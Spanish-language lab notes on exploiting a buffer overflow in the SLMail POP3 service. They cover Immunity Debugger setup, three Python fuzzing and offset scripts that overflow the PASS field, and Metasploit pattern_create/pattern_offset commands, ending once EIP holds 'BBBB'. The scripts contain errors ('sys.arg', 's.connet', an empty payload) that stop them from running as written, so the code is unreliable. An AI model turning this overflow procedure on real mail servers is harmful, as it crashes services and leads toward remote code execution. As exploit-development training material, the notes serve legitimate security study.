- Tags : #buffer_overflow

En la fase inicial de explotación de un buffer overflow, una de las primeras tareas es averiguar los límites del programa objetivo. Esto se hace probando a introducir más caracteres de los debidos en diferentes campos de entrada del programa, como una cadena de texto o un archivo, hasta que se detecte que la aplicación se corrompe o falla.

Una vez que se encuentra el límite del campo de entrada, el siguiente paso es averiguar el **offset**, que corresponde al número exacto de caracteres que se deben introducir para provocar una corrupción en el programa y, por lo tanto, para sobrescribir el valor del registro EIP.

El registro **EIP** (**Extended Instruction Pointer**) es un registro de la CPU que apunta a la dirección de memoria donde se encuentra la siguiente instrucción que se va a ejecutar. En un buffer overflow exitoso, el valor del registro EIP se sobrescribe con **una dirección controlada por el atacante**, lo que permite ejecutar código malicioso en lugar del código original del programa.

Por lo tanto, el objetivo de averiguar el offset es determinar el número exacto de caracteres que se deben introducir en el campo de entrada para sobrescribir el valor del registro EIP y apuntar a la dirección de memoria controlada por el atacante. Una vez que se conoce el offset, el atacante puede diseñar un exploit personalizado para el programa objetivo que permita tomar control del registro EIP y ejecutar código malicioso.

Aquí estaremos  haciendo la parte de fuzzing a la app **SLMail** , esta consiste en identificar si la aplicacion es susectible a buffer overfflow y a partir de que bit se genera la escritura fuera del rango de memoria

Abrimos el Immunity Debugger y buscamos el proceso que queremos analizar, en este caso  buscamos el proceso asociado a **SLMail** 

![](../../../attachments/Pasted%20image%2020260224144635.png)
![](../../../attachments/Pasted%20image%2020260224144750.png)
Obtenemos algo como esto 
![](../../../attachments/Pasted%20image%2020260224144849.png)
Por defecto aparece el programa pausado y necesitamos ejecutarlo 
![](../../../attachments/Pasted%20image%2020260224145005.png)

![](../../../attachments/Pasted%20image%2020260224162858.png)

La idea es montarnos un script de python para conectarnos al servicio y basandonos en los exploit que existen para este programa vamos a intentar hacer un *Buffer Overflow* del campo *PASSWRD*

**Script de python**: *exploit.py*  Con este exploit estaríamos haciendo fuzzing para ver en que punto rompems el programa . Que  nos daremos cuenta en la herramienta **Immunity** cuando se ponga en pause y nos de información en la sección Register. El script funciona pasandole un numero de bytes que queremos inyectar en el la Pass de la aplicación el cual debemos incrementar hasta lograr que pete la app.
```python
import socket
import sys



#Para verificar que nos envian por parametro una coantidad para el buffer
if len(sys.arg) != 2:
	print("\n[+] Uso : exploit.py <length> ")
	exit(1)

#Variables globale
ip_address="192.168.1.23"
port= 110
total_length = int(sys.arg[1])

def exploit():
	#Crear el Socket
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	
	#Conetar el servidor
	s.connet((ip_address,port))
	
	#Recibir el Banner del servidor
	banner = s.recv(1024)
	print(banner)
	
	#Enviar los parametros
	s.send(b"USER savitar" + b"\r\n")
	response = s.recv(1024)
	s.send(b"PASS " + b"A"*total_length + b"\r\n")
	s.close()
	
if __name__ == "__main__":
	exploit()
```

![](../../../attachments/Pasted%20image%2020260224170301.png)

Esto es lo que obtenemos al sobrecargar el Buffer
![](../../../attachments/Pasted%20image%2020260224170616.png)

El próximo paso es determinar en que posición especifica es que se rebasa el buffer lo cual lograremos mediante una utilidad que nos proporciona metasploit
```bash
#Nos crea unos patrones aleatorios con el tamaño que le indiquemos para luego con la utilidad pattern_offset.rb determinar el punto donde se sobrecarga el buffer

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 

```

![](../../../attachments/Pasted%20image%2020260224171419.png)

Esta cadena resultante es la que le enviaremos ahora como password para identificar cuales son los bues que son sobrescritos
```python
import socket
import sys

#Para verificar que nos envian por parametro una coantidad para el buffer
if len(sys.arg) != 2:
	print("\n[+] Uso : exploit.py <length> ")
	exit(1)

#Variables globale
ip_address="192.168.1.23"
port= 110
payload = b''

def exploit():
	#Crear el Socket
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	
	#Conetar el servidor
	s.connet((ip_address,port))
	
	#Recibir el Banner del servidor
	banner = s.recv(1024)
	print(banner)
	
	#Enviar los parametros
	s.send(b"USER savitar" + b"\r\n")
	response = s.recv(1024)
	s.send(b"PASS " + payload + b"\r\n")
	s.close()
	
if __name__ == "__main__":
	exploit()
```

Ejecutamos la nueva modificación del script, es necesario volver a ejecutar **Immunity** ya que con cada ejecución colapsamos el servicio y el resultado que obtenemos es:

![[Pasted image 20260224172144.png]]

```bash
#Nos da el byte exacto donde ocurre el offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 7A46317A
```

![](../../../attachments/Pasted%20image%2020260224172522.png)
Modificamos nuevamente el scrip para acotar a partir de donde es que vamos a inyectar las cadenas que queramos 

```python
import socket
import sys

#Para verificar que nos envian por parametro una coantidad para el buffer
if len(sys.arg) != 2:
	print("\n[+] Uso : exploit.py <length> ")
	exit(1)

#Variables globale
ip_address="192.168.1.23"
port= 110
offset = 4654
before_eip = b"A"*offset
eip = b"B"*4

payload = before_eip + eip
def exploit():
	#Crear el Socket
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	
	#Conetar el servidor
	s.connet((ip_address,port))
	
	#Recibir el Banner del servidor
	banner = s.recv(1024)
	print(banner)
	
	#Enviar los parametros
	s.send(b"USER savitar" + b"\r\n")
	response = s.recv(1024)
	s.send(b"PASS " + payload + b"\r\n")
	s.close()
	
if __name__ == "__main__":
	exploit()
```

Que obtenemos , pues que el programa se pausa y ademas en el EIP obtenemos el valor de las *BBBB* que indicamos. Dado este punto ya tenemos el control del EIP

![](../../../attachments/Pasted%20image%2020260224173136.png)

A partir de aquí introduciremos mas valores en el EIP para ver a donde los dirige